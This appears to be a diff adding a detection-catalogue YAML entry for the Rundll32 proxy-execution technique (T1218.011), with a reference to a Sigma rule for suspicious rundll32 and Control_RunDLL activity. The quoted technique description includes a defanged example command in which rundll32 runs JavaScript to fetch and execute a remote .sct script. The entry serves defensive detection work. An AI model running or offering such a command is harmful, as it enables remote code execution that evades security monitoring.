@@ -1,0 +1,20 @@
+Attack_name: Rundll32
+Attack_description: |-
+  Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.
+
+  Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)
+
+  Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
+guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+name: Rundll32 with Control_RunDLL
+tactic:
+  - defense-evasion
+technique:
+  - T1218.011
+os:
+  - windows
+description: "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n"
+sigma: true
+sigma_rule:
+  - id: e593cf51-88db-4ee1-b920-37e89012a3c9
+    name: win_susp_rundll32_activity.yml
